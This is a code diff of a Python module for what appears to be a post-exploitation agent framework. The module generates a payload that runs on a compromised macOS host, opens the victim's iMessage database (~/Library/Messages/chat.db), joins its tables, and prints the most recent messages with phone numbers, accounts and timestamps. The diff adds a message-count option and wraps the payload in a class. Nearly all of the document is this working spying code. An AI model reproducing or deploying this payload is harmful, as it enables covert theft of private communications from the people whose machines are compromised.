@@ -44,6 +44,12 @@ class Module:
                 'Description'   :   'Agent to run from.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'Messages' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'The number of messages to enumerate from most recent.',
+                'Required'      :   True,
+                'Value'         :   '10'
             }
         }
         # save off a copy of the mainMenu object to access external functionality
@@ -62,85 +68,106 @@ class Module:
                     self.options[option]['Value'] = value
 
     def generate(self):
-        script = """
-def func():
-    try:
-        # I had to call within the target function
-        from os.path import expanduser
-        import sqlite3
-        home = expanduser("~") + '/Library/Messages/chat.db'
-        # Open the database handle for the user
-        conn = sqlite3.connect(home)
-        cur = conn.cursor()
-        # Query Date, Text message and place it into a array
-        cur.execute("SELECT date,text,service,account,ROWID FROM message;")
-        # execute the data enum
-        statment = cur.fetchall()
-        # handle: Table links the number, country, type to the chat ID
-        # SELECT * FROM handle
-        # ex: (2, u'+12150000000', u'US', u'iMessage', None)
-        cur.execute("SELECT ROWID,id,country,service FROM handle")
-        handle = cur.fetchall()
-        # chat_message_join: Links the chat ID to the Text ID (sequency number)
-        # SELECT * FROM chat_message_join
-        cur.execute("SELECT chat_id,message_id FROM chat_message_join")
-        messageLink = cur.fetchall()
-        #cur.execute("SELECT account_id,service_center,chat_identifier FROM chat")
-        #GuidData = cur.fetchall()
-        # Itterate over data
-        for item in statment:
-            try:
-                for messageid in messageLink:
-                    if str(messageid[1]) == str(item[4]):
-                        chatid =  messageid[0]
-                        for rowid in handle:
-                            if str(rowid[0]) == str(chatid):
-                                Number = str(rowid[1])
-                                Country = str(rowid[2])
-                                Type = str(rowid[3])
+        count = self.options['Messages']['Value']
+        script = "count = " + str(count)
+        script += """
+try:
+    
+    class imessage_dump():
 
-                epoch = TimeConv(item[0])
-                line =  " \\nROWID: " + str(item[4])
-                line += " \\nService: " + item[2]
-                line += " \\nAccount: " + item[3]
-                line += " \\nDate: " + epoch
-                line += " \\nNumber: " + Number
-                line += " \\nCountry: " + Country
-                line += " \\nType: " + Type 
-                line += " \\nMessage: " + str(RemoveUnicode(item[1]))
-                print line
+        def __init__(self):
+            try:
+                print " [*] Message Enumeration Started!"
             except Exception as e:
                 print e
-        conn.close()
-        print " [!] Messages Enumerated: " + str(len(statment)) 
-    except Exception as e:
-        print e
-    # Close the Database handle
 
-def TimeConv(epoch):
-    import datetime
-    d = datetime.datetime.strptime("01-01-1904", "%m-%d-%Y")
-    time = (d + datetime.timedelta(seconds=epoch)).strftime("%a, %d %b %Y %H:%M:%S GMT")
-    return time
-    
-def RemoveUnicode(string):
-        import re
-        try:
-            string_data = string
-            if string_data is None:
-                return string_data
-            if isinstance(string_data, str):
-                string_data = str(string_data.decode('ascii', 'ignore'))
-            else:
-                string_data = string_data.encode('ascii', 'ignore')
-            remove_ctrl_chars_regex = re.compile(r'[^\x20-\x7e]')
-            CleanString = remove_ctrl_chars_regex.sub('', string_data)
-            return CleanString
-        except Exception as e:
-            p = '[!] UTF8 Decoding issues Matching: ' + str(e)
-            print p
-func()
-"""
+
+        def func(self, count):
+            try:
+                import sqlite3
+                from os.path import expanduser
+                home = expanduser("~") + '/Library/Messages/chat.db'
+                # Open the database handle for the user
+                conn = sqlite3.connect(home)
+                cur = conn.cursor()
+                # Query Date, Text message and place it into a array
+                cur.execute("SELECT date,text,service,account,ROWID FROM message;")
+                # execute the data enum
+                statment = cur.fetchall()
+                # handle: Table links the number, country, type to the chat ID
+                # SELECT * FROM handle
+                # ex: (2, u'+12150000000', u'US', u'iMessage', None)
+                cur.execute("SELECT ROWID,id,country,service FROM handle")
+                handle = cur.fetchall()
+                # chat_message_join: Links the chat ID to the Text ID (sequency number)
+                # SELECT * FROM chat_message_join
+                cur.execute("SELECT chat_id,message_id FROM chat_message_join")
+                messageLink = cur.fetchall()
+                #cur.execute("SELECT account_id,service_center,chat_identifier FROM chat")
+                #GuidData = cur.fetchall()
+                # Itterate over data
+                count = count * -1
+                for item in statment[count:]:
+                    try:
+                        for messageid in messageLink:
+                            if str(messageid[1]) == str(item[4]):
+                                chatid =  messageid[0]
+                                for rowid in handle:
+                                    if str(rowid[0]) == str(chatid):
+                                        Number = str(rowid[1])
+                                        Country = str(rowid[2])
+                                        Type = str(rowid[3])
+
+                        epoch = self.TimeConv(item[0])
+                        print " ROWID: " + str(item[4])
+                        print " Service: " + item[2]
+                        print " Account: " + item[3]
+                        print " Date: " + epoch
+                        print " Number: " + Number
+                        print " Country: " + Country
+                        print " Type: " + Type 
+                        print " Message: " + str(self.RemoveUnicode(item[1])) 
+                        print ""
+                    except Exception as e:
+                        print e
+                conn.close()
+                print "[!] Messages in DataStore: " + str(len(statment)) 
+                count = count * -1
+                print "[!] Messages Enumerated: " + str(count) 
+            except Exception as e:
+                print e
+            # Close the Database handle
+
+        def TimeConv(self, epoch):
+            import datetime
+            d = datetime.datetime.strptime("01-01-1904", "%m-%d-%Y")
+            time = (d + datetime.timedelta(seconds=epoch)).strftime("%a, %d %b %Y %H:%M:%S GMT")
+            return time
+            
+        def RemoveUnicode(self, string):
+                import re
+                try:
+                    string_data = string
+                    if string_data is None:
+                        return string_data
+                    if isinstance(string_data, str):
+                        string_data = str(string_data.decode('ascii', 'ignore'))
+                    else:
+                        string_data = string_data.encode('ascii', 'ignore')
+                    remove_ctrl_chars_regex = re.compile(r'[^\x20-\x7e]')
+                    CleanString = remove_ctrl_chars_regex.sub('', string_data)
+                    return CleanString
+                except Exception as e:
+                    p = '[!] UTF8 Decoding issues Matching: ' + str(e)
+                    print p
+    im = imessage_dump()
+    im.func(count)
+except Exception as e:
+    print e""" 
+
+
+        # add any arguments to the end exec
+
         return script
         
 # handle: Table links the number, country, type to the chat ID
